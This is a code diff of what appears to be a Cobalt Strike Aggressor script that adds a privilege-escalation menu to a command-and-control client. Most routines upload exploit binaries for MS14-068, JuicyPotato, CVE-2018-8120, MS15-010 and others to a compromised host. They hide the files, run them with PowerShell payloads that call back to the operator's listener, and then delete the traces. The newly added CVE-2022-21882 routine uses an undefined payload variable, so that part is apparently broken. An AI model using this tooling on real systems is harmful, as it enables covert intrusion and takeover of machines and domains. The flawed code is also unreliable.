@@ -149,7 +149,7 @@ sub RunJuicyPotato{
     $handle = openf("> $+ $fname");
     writeb($handle, $payload);
     closef($handle);
-    bcd($bid,"C:\\Windows\\Temp\\");
+    bcd($bid,"C:\\Users\\Public\\");
     bupload($bid, script_resource("bin/Privilege_escalation/MS16_075/jp.exe"));
     bupload($bid, $fname);
     bshell($bid, "attrib \"jp.exe\" +s +h");
@@ -159,19 +159,19 @@ sub RunJuicyPotato{
     bshell($bid,"del /F /S /Q /AH ".$fname);
 }
 
-sub MS14-068{
+sub MS14_068{
     btask($bid, 'Mimkaztz kerberos::purge');
     bmimikatz($bid, "kerberos::purge");
     if (-is64 $bid['id']) {
         btask($bid, 'Is x64 machine');
         btask($bid, 'Run kekeo.exe');
-        bcd($bid, "C:\\Windows\\Temp\\");
+        bcd($bid, "C:\\Users\\Public\\");
         bupload($bid, script_resource("bin/Privilege_escalation/MS14-068/x64/kekeo.exe"));
         bshell($bid,"kekeo.exe \"exploit::ms14068 /domain:".$3["domain"]." /user:".$3["user"]." /password:".$3["password"]." /ptt\" \"exit\"");
     }else{
         btask($bid, 'Is not x64 machine');
         btask($bid, 'Run kekeo.exe');
-        bcd($bid, "C:\\Windows\\Temp\\");
+        bcd($bid, "C:\\Users\\Public\\");
         bupload($bid, script_resource("bin/Privilege_escalation/MS14-068/Win32/kekeo.exe"));
         bshell($bid,"kekeo.exe \"exploit::ms14068 /domain:".$3["domain"]." /user:".$3["user"]." /password:".$3["password"]." /ptt\" \"exit\"");
         }
@@ -183,7 +183,7 @@ sub CVE_2018_8120{
         $Rch = "x64";
     }
     $payload = powershell($3['listener'], false, $Rch);
-    bcd($bid,"C:\\Windows\\Temp\\");
+    bcd($bid,"C:\\Users\\Public\\");
     bupload($bid, script_resource("bin/Privilege_escalation/CVE_2018_8120/".$Rch.".exe"));
     bshell($bid, "attrib \"".$Rch.".exe\" +s +h");
     bshell($bid,$Rch.".exe \"".$payload."\"");
@@ -198,7 +198,7 @@ sub MS15_010{
         $Rch = "x64";
     }
     $payload = powershell($3['listener'], false, $Rch);
-    bcd($bid,"C:\\Windows\\Temp\\");
+    bcd($bid,"C:\\Users\\Public\\");
     bupload($bid, script_resource("bin/Privilege_escalation/MS15-010/ms15-010.exe"));
     bshell($bid, "attrib \"ms15-010.exe\" +s +h");
     bshell($bid,"ms15-010.exe \"".$payload."\"");
@@ -212,7 +212,7 @@ sub MS15_015{
         $Rch = "x64";
     }
     $payload = powershell($3['listener'], false, $Rch);
-    bcd($bid,"C:\\Windows\\Temp\\");
+    bcd($bid,"C:\\Users\\Public\\");
     bupload($bid, script_resource("bin/Privilege_escalation/MS15-015/MS15-015.exe"));
     bshell($bid, "attrib \"MS15-015.exe\" +s +h");
     bshell($bid,"MS15-015.exe \"".$payload."\"");
@@ -226,7 +226,7 @@ sub CVE_2019_0803{
         $Rch = "x64";
     }
     $payload = powershell($3['listener'], false, $Rch);
-    bcd($bid,"C:\\Windows\\Temp\\");
+    bcd($bid,"C:\\Users\\Public\\");
     bupload($bid, script_resource("bin/Privilege_escalation/CVE_2019_0803/CVE-2019-0803.exe"));
     bshell($bid, "attrib \"CVE-2019-0803.exe\" +s +h");
     bshell($bid,"CVE-2019-0803.exe \"".$payload."\"");
@@ -256,6 +256,14 @@ sub DCOMPotato{
         bexecute_assembly($bid, script_resource("bin/PrinterNotifyPotato.exe"),$3["Command"]);
     }
     
+}
+sub CVE_2022_21882{
+    bcd($bid,"C:\\Users\\Public\\");
+    bupload($bid, script_resource("bin/Privilege_escalation/CVE_2022_21882/CVE_2022_21882.exe"));
+    bshell($bid, "attrib \"CVE_2022_21882.exe\" +s +h");
+    bshell($bid,"CVE_2022_21882.exe \"".$payload."\"");
+    bshell($bid,"taskkill /f /im CVE_2022_21882");
+    bshell($bid,"del /F /S /Q /AH CVE_2022_21882");
 }
 menu "提权"{
     item "MS16-032"{
@@ -354,7 +362,7 @@ menu "提权"{
     }
     item "[域]MS14-068" {
         $bid = $1;
-        $dialog = dialog("MS14-068",%(bid => $bid),&MS14-068);
+        $dialog = dialog("MS14-068",%(bid => $bid),&MS14_068);
         dialog_description($dialog, "MS14-068 is a Windows vulnerability in the Key Distribution Center (KDC) service. It allows an authenticated user to insert an arbitrary PAC (a structure that represent all user rights) in its Kerberos ticket (the TGT).");
         drow_text($dialog, "domain",  "Domain");
         drow_text($dialog, "user",  "Username");
@@ -421,6 +429,14 @@ menu "提权"{
         dialog_description($Dialog, "DCOMPotato");
         drow_text($Dialog, "Command", "Command: ");
         drow_combobox($Dialog, "exploit",  "Exploit: ", @("McpManagementPotato","PrinterNotifyPotato"));
+        dbutton_action($Dialog, "Exploit");
+        dialog_show($Dialog);
+    }
+    item "CVE-2022-21882(x64)"{
+        $bid = $1['@'];
+        $Dialog = dialog("CVE-2022-21882",%(Command =>"whoami", bid => $bid),&CVE_2022_21882);
+        dialog_description($Dialog, "Win32k 提取，该漏洞是利用 CVE-2021-1732 漏洞（已修复）的一种延伸手段");
+        drow_text($Dialog, "Command", "Command: ");
         dbutton_action($Dialog, "Exploit");
         dialog_show($Dialog);
     }
